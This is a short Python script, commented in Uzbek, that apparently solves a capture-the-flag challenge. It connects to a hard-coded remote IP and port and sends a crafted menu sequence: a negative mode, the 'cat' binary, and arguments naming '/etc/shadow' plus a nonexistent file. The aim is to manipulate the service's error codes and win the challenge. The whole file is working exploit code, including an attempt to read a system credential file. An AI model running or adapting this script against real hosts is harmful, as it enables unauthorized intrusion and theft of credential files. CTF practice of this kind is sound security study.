import socket
import time

def solve():
    host = '154.57.164.68'
    port = 31363

    # Serverga ulanish
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    def send_cmd(cmd):
        s.sendall(cmd.encode() + b'\n')
        time.sleep(0.5) # Server javob berishiga ozgina vaqt

    # 1. Mode o'rnatish: -1
    send_cmd("1")
    send_cmd("-1")

    # 2. Bin o'rnatish: cat (yoki istalgan 2-3 harfli mavjud dastur)
    send_cmd("2")
    send_cmd("cat")

    # 3. Argumentlarni yuborish
    # Maqsad: 
    # debug[0] = 1 (error) * -1 = -1
    # debug[1] = 2 (not found/usage error) * -1 = -2
    # Diqqat: 'cat' birinchi argumentda 1, ikkinchisida 2 qaytarishi uchun:
    send_cmd("3")
    send_cmd("/etc/shadow,notexist") 

    # 4. Switchlarni yuborish
    send_cmd("4")
    send_cmd(".,.") 

    # 5. Beat the competitor!
    send_cmd("5")

    # Barcha javoblarni o'qish
    time.sleep(1)
    response = s.recv(4096).decode()
    print(response)
    s.close()

if __name__ == "__main__":
    solve()
